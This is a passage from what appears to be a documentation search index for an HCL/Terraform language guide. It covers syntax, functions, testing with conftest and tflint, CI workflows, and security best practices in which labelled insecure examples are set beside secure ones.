values\nlocals {\n  common_tags = {\n    Environment = var.environment\n    Project     = var.project_name\n    ManagedBy   = \"Terraform\"\n  }\n\n  # Computed local\n  instance_name = \"${var.environment}-${var.application}-instance\"\n\n  # Conditional local\n  use_spot = var.environment == \"dev\" ? true : false\n}\n\n## Use local values\nresource \"aws_instance\" \"web\" {\n  ami           = var.ami_id\n  instance_type = var.instance_type\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = local.instance_name\n    }\n  )\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#expressions","title":"Expressions","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#references","title":"References","text":"<pre><code>## Variable reference\nvar.instance_type\n\n## Resource attribute reference\naws_instance.web.id\naws_instance.web.private_ip\n\n## Local value reference\nlocal.common_tags\n\n## Module output reference\nmodule.vpc.vpc_id\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#operators","title":"Operators","text":"<pre><code>## Arithmetic\nlocals {\n  total_size = var.base_size + 10\n  doubled    = var.count * 2\n  divided    = var.total / 2\n  remainder  = var.number % 3\n}\n\n## Comparison\nlocals {\n  is_production = var.environment == \"prod\"\n  not_dev       = var.environment != \"dev\"\n  is_large      = var.instance_count &gt; 10\n  is_valid      = var.port &gt;= 1 &amp;&amp; var.port &lt;= 65535\n}\n\n## Logical\nlocals {\n  deploy = var.enabled &amp;&amp; var.environment == \"prod\"\n  skip   = !var.enabled || var.environment == \"test\"\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#conditional-expressions","title":"Conditional Expressions","text":"<pre><code>## Ternary operator\nlocals {\n  instance_type = var.environment == \"prod\" ? \"t3.large\" : \"t3.micro\"\n\n  enable_backup = var.environment == \"prod\" ? true : false\n\n  # Nested conditional\n  tier = (\n    var.environment == \"prod\" ? \"production\" :\n    var.environment == \"staging\" ? \"staging\" :\n    \"development\"\n  )\n}\n\nresource \"aws_instance\" \"web\" {\n  count = var.enabled ? 1 : 0\n\n  ami           = var.ami_id\n  instance_type = local.instance_type\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#functions","title":"Functions","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#string-functions","title":"String Functions","text":"<pre><code>locals {\n  # Convert to uppercase\n  upper_env = upper(var.environment)\n\n  # Convert to lowercase\n  lower_name = lower(var.name)\n\n  # String formatting\n  bucket_name = format(\"%s-%s-bucket\", var.project, var.environment)\n\n  # String joining\n  fqdn = join(\".\", [var.hostname, var.domain])\n\n  # String splitting\n  name_parts = split(\"-\", var.resource_name)\n\n  # String replacement\n  sanitized = replace(var.name, \"_\", \"-\")\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#collection-functions","title":"Collection Functions","text":"<pre><code>locals {\n  # List functions\n  first_zone = element(var.availability_zones, 0)\n  zone_count = length(var.availability_zones)\n  unique_items = distinct(var.list_with_duplicates)\n  sorted_list = sort(var.unsorted_list)\n\n  # Map functions\n  tag_keys = keys(var.tags)\n  tag_values = values(var.tags)\n  merged_tags = merge(local.common_tags, var.custom_tags)\n\n  # Lookup with default\n  instance_type = lookup(var.instance_types, var.environment, \"t3.micro\")\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#type-conversion-functions","title":"Type Conversion Functions","text":"<pre><code>locals {\n  # Convert to string\n  port_string = tostring(var.port)\n\n  # Convert to number\n  count_number = tonumber(var.count_string)\n\n  # Convert to list\n  zone_list = tolist(var.zone_set)\n\n  # Convert to set\n  unique_zones = toset(var.zone_list)\n\n  # Convert to map\n  tag_map = tomap({\n    Environment = var.environment\n    Name        = var.name\n  })\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#encoding-functions","title":"Encoding Functions","text":"<pre><code>locals {\n  # JSON encoding\n  config_json = jsonencode({\n    environment = var.environment\n    region      = var.region\n  })\n\n  # JSON decoding\n  config_object = jsondecode(var.config_json)\n\n  # Base64 encoding\n  user_data = base64encode(file(\"${path.module}/user-data.sh\"))\n\n  # Base64 decoding\n  decoded_data = base64decode(var.encoded_data)\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#dynamic-blocks","title":"Dynamic Blocks","text":"<pre><code>## Dynamic block for repeated nested blocks\nresource \"aws_security_group\" \"web\" {\n  name        = \"web-sg\"\n  description = \"Security group for web servers\"\n  vpc_id      = var.vpc_id\n\n  dynamic \"ingress\" {\n    for_each = var.ingress_rules\n    content {\n      from_port   = ingress.value.from_port\n      to_port     = ingress.value.to_port\n      protocol    = ingress.value.protocol\n      cidr_blocks = ingress.value.cidr_blocks\n      description = ingress.value.description\n    }\n  }\n}\n\n## Variable definition\nvariable \"ingress_rules\" {\n  type = list(object({\n    from_port   = number\n    to_port     = number\n    protocol    = string\n    cidr_blocks = list(string)\n    description = string\n  }))\n\n  default = [\n    {\n      from_port   = 80\n      to_port     = 80\n      protocol    = \"tcp\"\n      cidr_blocks = [\"0.0.0.0/0\"]\n      description = \"HTTP\"\n    },\n    {\n      from_port   = 443\n      to_port     = 443\n      protocol    = \"tcp\"\n      cidr_blocks = [\"0.0.0.0/0\"]\n      description = \"HTTPS\"\n    }\n  ]\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#for-expressions","title":"For Expressions","text":"<pre><code>## List transformation\nlocals {\n  # Transform list\n  uppercase_names = [for name in var.names : upper(name)]\n\n  # Filter list\n  prod_instances = [\n    for instance in var.instances :\n    instance if instance.environment == \"prod\"\n  ]\n\n  # Map to list\n  instance_ids = [for k, v in var.instances : v.id]\n}\n\n## Map transformation\nlocals {\n  # Transform map\n  uppercase_tags = {\n    for key, value in var.tags :\n    key =&gt; upper(value)\n  }\n\n  # Filter map\n  prod_tags = {\n    for key, value in var.tags :\n    key =&gt; value if value != \"\"\n  }\n\n  # Create map from list\n  instance_map = {\n    for instance in var.instances :\n    instance.id =&gt; instance.name\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#string-templates","title":"String Templates","text":"<pre><code>## String interpolation\nlocals {\n  greeting = \"Hello, ${var.name}!\"\n\n  # Multi-line string\n  user_data = &lt;&lt;-EOF\n    #!/bin/bash\n    echo \"Environment: ${var.environment}\"\n    echo \"Region: ${var.region}\"\n  EOF\n\n  # String directive\n  config = &lt;&lt;-EOT\n    %{ for instance in var.instances ~}\n    server ${instance.name} {\n      address = ${instance.ip}\n    }\n    %{ endfor ~}\n  EOT\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#best-practices","title":"Best Practices","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#use-descriptive-names","title":"Use Descriptive Names","text":"<pre><code>## Good - Descriptive variable names\nvariable \"web_server_instance_type\" {\n  type        = string\n  description = \"EC2 instance type for web servers\"\n  default     = \"t3.micro\"\n}\n\n## Bad - Cryptic names\nvariable \"wst\" {\n  type    = string\n  default = \"t3.micro\"\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#provide-descriptions","title":"Provide Descriptions","text":"<pre><code>## Good - Clear descriptions\nvariable \"database_backup_retention_days\" {\n  type        = number\n  description = \"Number of days to retain automated database backups\"\n  default     = 7\n}\n\n## Bad - No description\nvariable \"retention\" {\n  type    = number\n  default = 7\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#use-type-constraints","title":"Use Type Constraints","text":"<pre><code>## Good - Explicit types\nvariable \"server_config\" {\n  type = object({\n    instance_type = string\n    disk_size     = number\n    monitoring    = bool\n  })\n}\n\n## Bad - No type constraint\nvariable \"server_config\" {\n  default = {}\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#group-related-resources","title":"Group Related Resources","text":"<pre><code>## Good - Logical grouping with locals\nlocals {\n  network_config = {\n    vpc_cidr           = \"10.0.0.0/16\"\n    public_subnet_cidr = \"10.0.1.0/24\"\n    private_subnet_cidr = \"10.0.2.0/24\"\n  }\n\n  common_tags = {\n    Environment = var.environment\n    Project     = var.project_name\n    ManagedBy   = \"Terraform\"\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#testing","title":"Testing","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#testing-hcl-configuration","title":"Testing HCL Configuration","text":"<p>Use <code>terraform validate</code> and <code>terraform fmt</code> for basic testing:</p> <pre><code>## Validate syntax and configuration\nterraform validate\n\n## Check formatting\nterraform fmt -check -recursive\n\n## Format files\nterraform fmt -recursive\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#testing-with-conftest","title":"Testing with Conftest","text":"<p>Use Conftest with Open Policy Agent (OPA) to test HCL:</p> <pre><code>## Install conftest\nbrew install conftest\n\n## Test Terraform configurations\nconftest test main.tf\n\n## Test with specific policy\nconftest test main.tf -p policy/\n\n## Test all .tf files\nconftest test *.tf\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#conftest-policy-example","title":"Conftest Policy Example","text":"<p>Create policies in Rego:</p> <pre><code>## policy/terraform.rego\npackage main\n\ndeny[msg] {\n  resource := input.resource.aws_instance[name]\n  not resource.instance_type\n  msg := sprintf(\"AWS instance '%s' missing instance_type\", [name])\n}\n\ndeny[msg] {\n  resource := input.resource.aws_s3_bucket[name]\n  not resource.versioning\n  msg := sprintf(\"S3 bucket '%s' must have versioning enabled\", [name])\n}\n\ndeny[msg] {\n  resource := input.resource.aws_security_group[name]\n  rule := resource.ingress[_]\n  rule.cidr_blocks[_] == \"0.0.0.0/0\"\n  rule.from_port == 22\n  msg := sprintf(\"Security group '%s' allows SSH from anywhere\", [name])\n}\n\nwarn[msg] {\n  resource := input.resource.aws_instance[name]\n  resource.instance_type == \"t2.micro\"\n  msg := sprintf(\"Instance '%s' using t2.micro (consider burstable alternatives)\", [name])\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#running-conftest-tests","title":"Running Conftest Tests","text":"<pre><code>## Test with custom namespace\nconftest test -p policy/ --namespace terraform main.tf\n\n## Output in different formats\nconftest test main.tf -o json\nconftest test main.tf -o tap\n\n## Fail on warnings\nconftest test main.tf --fail-on-warn\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#testing-with-terraform-plan","title":"Testing with Terraform Plan","text":"<p>Test planned changes:</p> <pre><code>## Generate plan\nterraform plan -out=tfplan\n\n## Convert plan to JSON\nterraform show -json tfplan &gt; tfplan.json\n\n## Test plan with conftest\nconftest test tfplan.json\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#policy-for-terraform-plans","title":"Policy for Terraform Plans","text":"<pre><code>## policy/plan.rego\npackage terraform.analysis\n\ndeny[reason] {\n  resource_changes := input.resource_changes[_]\n  resource_changes.type == \"aws_s3_bucket\"\n  resource_changes.change.actions[_] == \"delete\"\n  reason := sprintf(\"Attempting to delete S3 bucket: %s\", [resource_changes.address])\n}\n\ndeny[reason] {\n  resource_changes := input.resource_changes[_]\n  resource_changes.type == \"aws_instance\"\n  instance_type := resource_changes.change.after.instance_type\n  not contains(instance_type, \"t3\")\n  not contains(instance_type, \"t4g\")\n  reason := sprintf(\"Instance %s uses non-approved instance type: %s\",\n    [resource_changes.address, instance_type])\n}\n\nwarn[reason] {\n  resource_changes := input.resource_changes[_]\n  resource_changes.change.actions[_] == \"delete\"\n  reason := sprintf(\"Resource will be deleted: %s\", [resource_changes.address])\n}\n\ncontains(str, substr) {\n  indexof(str, substr) != -1\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#testing-with-tflint","title":"Testing with tflint","text":"<p>Use tflint for Terraform-specific linting:</p> <pre><code>## Install tflint\nbrew install tflint\n\n## Initialize tflint (downloads plugins)\ntflint --init\n\n## Run tflint\ntflint\n\n## Run with specific config\ntflint --config=.tflint.hcl\n\n## Format output\ntflint --format=json\ntflint --format=checkstyle\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#tflint-configuration","title":"tflint Configuration","text":"<pre><code>## .tflint.hcl\nconfig {\n  module = true\n  force = false\n}\n\nplugin \"aws\" {\n  enabled = true\n  version = \"0.27.0\"\n  source  = \"github.com/terraform-linters/tflint-ruleset-aws\"\n}\n\nrule \"terraform_naming_convention\" {\n  enabled = true\n}\n\nrule \"terraform_deprecated_interpolation\" {\n  enabled = true\n}\n\nrule \"terraform_unused_declarations\" {\n  enabled = true\n}\n\nrule \"terraform_typed_variables\" {\n  enabled = true\n}\n\nrule \"aws_instance_invalid_type\" {\n  enabled = true\n}\n\nrule \"aws_s3_bucket_versioning_enabled\" {\n  enabled = true\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#integration-testing","title":"Integration Testing","text":"<p>Test HCL configurations in CI/CD:</p> <pre><code>## .github/workflows/terraform-test.yml\nname: Terraform Tests\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Terraform Format Check\n        run: terraform fmt -check -recursive\n\n      - name: Terraform Init\n        run: terraform init -backend=false\n\n      - name: Terraform Validate\n        run: terraform validate\n\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup TFLint\n        uses: terraform-linters/setup-tflint@v4\n\n      - name: Init TFLint\n        run: tflint --init\n\n      - name: Run TFLint\n        run: tflint --recursive\n\n  policy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Conftest\n        run: |\n          wget https://github.com/open-policy-agent/conftest/releases/latest/download/conftest_Linux_x86_64.tar.gz\n          tar xzf conftest_Linux_x86_64.tar.gz\n          sudo mv conftest /usr/local/bin\n\n      - name: Test Policies\n        run: conftest test *.tf -p policy/\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#unit-testing-hcl-modules","title":"Unit Testing HCL Modules","text":"<p>Test individual modules:</p> <pre><code>## tests/module_test.sh\n#!/bin/bash\n\nset -e\n\necho \"Testing VPC module...\"\n\ncd examples/vpc\n\n## Initialize\nterraform init\n\n## Validate\nterraform validate\n\n## Plan\nterraform plan -out=tfplan\n\n## Convert to JSON and test\nterraform show -json tfplan &gt; tfplan.json\nconftest test tfplan.json -p ../../policy/\n\necho \"VPC module tests passed!\"\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#compliance-testing","title":"Compliance Testing","text":"<p>Test for compliance requirements:</p> <pre><code>## policy/compliance.rego\npackage compliance\n\n# Ensure all resources have required tags\ndeny[msg] {\n  resource := input.resource[resource_type][name]\n  resource_type != \"terraform_data\"\n  not resource.tags.Environment\n  msg := sprintf(\"%s.%s missing required tag: Environment\", [resource_type, name])\n}\n\ndeny[msg] {\n  resource := input.resource[resource_type][name]\n  resource_type != \"terraform_data\"\n  not resource.tags.Owner\n  msg := sprintf(\"%s.%s missing required tag: Owner\", [resource_type, name])\n}\n\n# Ensure encryption at rest\ndeny[msg] {\n  bucket := input.resource.aws_s3_bucket[name]\n  not bucket.server_side_encryption_configuration\n  msg := sprintf(\"S3 bucket %s must have encryption enabled\", [name])\n}\n\ndeny[msg] {\n  db := input.resource.aws_db_instance[name]\n  not db.storage_encrypted\n  msg := sprintf(\"RDS instance %s must have storage encryption enabled\", [name])\n}\n\n# Ensure resources are in approved regions\napproved_regions := [\"us-east-1\", \"us-west-2\", \"eu-west-1\"]\n\ndeny[msg] {\n  resource := input.resource.aws_instance[name]\n  region := resource.provider.aws.region\n  not region_approved(region)\n  msg := sprintf(\"Instance %s in unapproved region: %s\", [name, region])\n}\n\nregion_approved(region) {\n  approved_regions[_] == region\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#testing-outputs","title":"Testing Outputs","text":"<p>Verify module outputs:</p> <pre><code>## Test outputs after apply\nterraform output -json &gt; outputs.json\n\n## Validate outputs with jq\njq -e '.vpc_id.value != null' outputs.json\njq -e '.subnet_ids.value | length &gt; 0' outputs.json\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#documentation-testing","title":"Documentation Testing","text":"<p>Ensure HCL is properly documented:</p> <pre><code>## Install terraform-docs\nbrew install terraform-docs\n\n## Generate documentation\nterraform-docs markdown table . &gt; README.md\n\n## Validate documentation exists\nif ! grep -q \"## Requirements\" README.md; then\n  echo \"Missing Requirements section in documentation\"\n  exit 1\nfi\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#security-best-practices","title":"Security Best Practices","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#never-hardcode-secrets","title":"Never Hardcode Secrets","text":"<p>Avoid storing sensitive data in HCL files:</p> <pre><code>## Bad - Hardcoded secrets in HCL\nvariable \"db_password\" {\n  default = \"MySecretPassword123\"  # \u274c Exposed in version control!\n}\n\nresource \"aws_db_instance\" \"main\" {\n  password = \"hardcoded_password\"  # \u274c Never do this!\n}\n\n## Good - Use variables without defaults for secrets\nvariable \"db_password\" {\n  type      = string\n  sensitive = true\n  # No default - must be provided at runtime\n}\n\n## Good - Use environment variables\n# Set via: export TF_VAR_db_password=\"...\"\nvariable \"db_password\" {\n  type      = string\n  sensitive = true\n}\n\n## Good - Use secret management systems\ndata \"aws_secretsmanager_secret_version\" \"db_password\" {\n  secret_id = \"production/db/password\"\n}\n\nresource \"aws_db_instance\" \"main\" {\n  password = data.aws_secretsmanager_secret_version.db_password.secret_string\n}\n\n## Good - Use Vault provider\ndata \"vault_generic_secret\" \"db_creds\" {\n  path = \"secret/database\"\n}\n\nresource \"aws_db_instance\" \"main\" {\n  password = data.vault_generic_secret.db_creds.data[\"password\"]\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Never commit secrets to <code>.tf</code> files</li> <li>Use <code>sensitive = true</code> for secret variables</li> <li>Read secrets from external systems (Vault, AWS Secrets Manager)</li> <li>Use environment variables (<code>TF_VAR_*</code>)</li> <li>Scan repositories for accidentally committed secrets</li> <li>Use <code>.tfvars</code> files (gitignored) for local development</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#secure-state-management","title":"Secure State Management","text":"<p>Protect Terraform state files containing sensitive data:</p> <pre><code>## Good - S3 backend with encryption\nterraform {\n  backend \"s3\" {\n    bucket         = \"mycompany-terraform-state\"\n    key            = \"prod/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true  # Server-side encryption\n    kms_key_id     = \"arn:aws:kms:us-east-1:123456789012:key/...\"\n    dynamodb_table = \"terraform-locks\"\n\n    # Access control\n    acl = \"private\"\n  }\n}\n\n## Good - Remote backend with access control\nterraform {\n  backend \"remote\" {\n    organization = \"my-company\"\n\n    workspaces {\n      name = \"production\"\n    }\n  }\n}\n\n## Good - Limit state file access\n# Set strict IAM policy for S3 state bucket\nresource \"aws_s3_bucket_policy\" \"state\" {\n  bucket = aws_s3_bucket.terraform_state.id\n\n  policy = jsonencode({\n    Statement = [{\n      Effect    = \"Deny\"\n      Principal = \"*\"\n      Action    = \"s3:*\"\n      Resource  = \"${aws_s3_bucket.terraform_state.arn}/*\"\n      Condition = {\n        Bool = {\n          \"aws:SecureTransport\" = \"false\"  # Require HTTPS\n        }\n      }\n    }]\n  })\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Always encrypt state files</li> <li>Use remote backends (S3, Terraform Cloud)</li> <li>Enable state locking (DynamoDB, etc.)</li> <li>Restrict state file access</li> <li>Never commit state files to version control</li> <li>Enable versioning on state storage</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#input-validation","title":"Input Validation","text":"<p>Validate all variable inputs:</p> <pre><code>## Good - Validate variable inputs\nvariable \"environment\" {\n  type = string\n  validation {\n    condition     = contains([\"dev\", \"staging\", \"prod\"], var.environment)\n    error_message = \"Environment must be dev, staging, or prod.\"\n  }\n}\n\nvariable \"instance_type\" {\n  type = string\n  validation {\n    condition     = can(regex(\"^t3\\\\.(micro|small|medium)$\", var.instance_type))\n    error_message = \"Instance type must be t3.micro, t3.small, or t3.medium.\"\n  }\n}\n\nvariable \"cidr_block\" {\n  type = string\n  validation {\n    condition     = can(cidrhost(var.cidr_block, 0))\n    error_message = \"CIDR block must be valid.\"\n  }\n}\n\nvariable \"port\" {\n  type = number\n  validation {\n    condition     = var.port &gt;= 1 &amp;&amp; var.port &lt;= 65535\n    error_message = \"Port must be between 1 and 65535.\"\n  }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Add validation blocks to all variables</li> <li>Use allow-lists for enums</li> <li>Validate formats (CIDR, email, etc.)</li> <li>Validate ranges for numbers</li> <li>Fail early on invalid inputs</li> <li>Document validation requirements</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#prevent-resource-deletion","title":"Prevent Resource Deletion","text":"<p>Protect critical resources from accidental deletion:</p> <pre><code>## Good - Lifecycle prevent_destroy\nresource \"aws_db_instance\" \"production\" {\n  identifier = \"prod-db\"\n  # ... other configuration ...\n\n  lifecycle {\n    prevent_destroy = true  # \u2705 Cannot be destroyed via Terraform\n  }\n}\n\n## Good - Deletion protection at resource level\nresource \"aws_db_instance\" \"production\" {\n  identifier          = \"prod-db\"\n  deletion_protection = true  # \u2705 AWS-level protection\n\n  lifecycle {\n    prevent_destroy = true\n  }\n}\n\n## Good - Create before destroy for zero downtime\nresource \"aws_instance\" \"web\" {\n  ami           = var.ami_id\n  instance_type = \"t3.micro\"\n\n  lifecycle {\n    create_before_destroy = true  # \u2705 New resource before destroying old\n  }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Use <code>prevent_destroy</code> for critical resources</li> <li>Enable resource-level deletion protection</li> <li>Use <code>create_before_destroy</code> for zero downtime</li> <li>Require manual intervention for dangerous changes</li> <li>Use separate workspaces for different environments</li> <li>Implement approval workflows</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#secure-default-values","title":"Secure Default Values","text":"<p>Avoid insecure defaults:</p> <pre><code>## Bad - Insecure defaults\nresource \"aws_s3_bucket\" \"data\" {\n  bucket = \"my-data-bucket\"\n  acl    = \"public-read\"  # \u274c Publicly accessible!\n}\n\nresource \"aws_security_group\" \"web\" {\n  ingress {\n    from_port   = 0\n    to_port     = 65535\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]  # \u274c Open to the internet!\n  }\n}\n\n## Good - Secure defaults\nresource \"aws_s3_bucket\" \"data\" {\n  bucket = \"my-data-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n  acl    = \"private\"  # \u2705 Private by default\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n\nresource \"aws_security_group\" \"web\" {\n  name = \"web-sg\"\n\n  ingress {\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = [\"10.0.0.0/8\"]  # \u2705 Restricted to private network\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Default to most restrictive settings</li> <li>Explicitly define security configurations</li> <li>Block public access by default</li> <li>Use least privilege for security groups</li> <li>Enable encryption by default</li> <li>Audit for overly permissive rules</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#audit-and-compliance","title":"Audit and Compliance","text":"<p>Implement audit logging and compliance checks:</p> <pre><code>## Good - Enable CloudTrail for audit logging\nresource \"aws_cloudtrail\" \"main\" {\n  name                          = \"main-trail\"\n  s3_bucket_name                = aws_s3_bucket.cloudtrail.id\n  include_global_service_events = true\n  is_multi_region_trail         = true\n  enable_logging                = true\n\n  event_selector {\n    read_write_type           = \"All\"\n    include_management_events = true\n  }\n}\n\n## Good - Tag resources for compliance\nlocals {\n  common_tags = {\n    Environment = var.environment\n    ManagedBy   = \"Terraform\"\n    Owner       = \"Platform Team\"\n    CostCenter  = \"Engineering\"\n    Compliance  = \"SOC2\"\n  }\n}\n\nresource \"aws_instance\" \"web\" {\n  ami           = var.ami_id\n  instance_type = \"t3.micro\"\n\n  tags = local.common_tags\n}\n\n## Good - Use terraform-compliance for policy checks\n# terraform-compliance.yml\n# - name: Ensure S3 buckets are encrypted\n#   when: resource.aws_s3_bucket\n#   then: it must have encryption\n</code></pre> <p>Key Points:</p> <ul> <li>Enable audit logging (CloudTrail, etc.)</li> <li>Tag all resources for tracking</li> <li>Use compliance frameworks (CIS, SOC2)</li> <li>Implement policy-as-code (Sentinel, OPA)</li> <li>Monitor for drift</li> <li>Regular security audits</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#anti-patterns","title":"Anti-Patterns","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-hardcoded-values","title":"\u274c Avoid: Hardcoded Values","text":"<pre><code>## Bad - Hardcoded values\nresource \"aws_instance\" \"web\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.micro\"\n\n  tags = {\n    Name = \"production-web-server\"\n  }\n}\n\n## Good - Use variables\nresource \"aws_instance\" \"web\" {\n  ami           = var.ami_id\n  instance_type = var.instance_type\n\n  tags = {\n    Name = \"${var.environment}-web-server\"\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-missing-type-constraints","title":"\u274c Avoid: Missing Type Constraints","text":"<pre><code>## Bad - No type constraint\nvariable \"config\" {\n  default = {}\n}\n\n## Good - Explicit type\nvariable \"config\" {\n  type = object({\n    name    = string\n    enabled = bool\n  })\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-complex-inline-logic","title":"\u274c Avoid: Complex Inline Logic","text":"<pre><code>## Bad - Complex inline logic\nresource \"aws_instance\" \"web\" {\n  count = var.environment == \"prod\" ? (var.high_availability ? 3 : 1) : (var.environment == \"staging\" ? 2 : 1)\n}\n\n## Good - Use locals for clarity\nlocals {\n  instance_count = (\n    var.environment == \"prod\" &amp;&amp; var.high_availability ? 3 :\n    var.environment == \"prod\" ? 1 :\n    var.environment == \"staging\" ? 2 :\n    1\n  )\n}\n\nresource \"aws_instance\" \"web\" {\n  count = local.instance_count\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-not-using-for_each-for-maps","title":"\u274c Avoid: Not Using for_each for Maps","text":"<pre><code>## Bad - Using count with maps (fragile to reordering)\nvariable \"users\" {\n  default = [\"alice\", \"bob\", \"charlie\"]\n}\n\nresource \"aws_iam_user\" \"users\" {\n  count = length(var.users)\n  name  = var.users[count.index]\n}\n\n## Good - Use for_each\nvariable \"users\" {\n  type = set(string)\n  default = [\"alice\", \"bob\", \"charlie\"]\n}\n\nresource \"aws_iam_user\" \"users\" {\n  for_each = var.users\n  name     = each.value\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-mixing-resource-types-in-one-file","title":"\u274c Avoid: Mixing Resource Types in One File","text":"<pre><code>## Bad - All resources in main.tf\n## main.tf with VPC, EC2, S3, IAM, etc. (1000+ lines)\n\n## Good - Separate by resource type\n## network.tf - VPC, subnets, route tables\n## compute.tf - EC2 instances, auto-scaling\n## storage.tf - S3 buckets, EBS volumes\n## security.tf - IAM roles, security groups\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#avoid-not-using-dynamic-blocks","title":"\u274c Avoid: Not Using Dynamic Blocks","text":"<pre><code>## Bad - Repetitive inline blocks\nresource \"aws_security_group\" \"web\" {\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n  ingress {\n    from_port   = 443\n    to_port     = 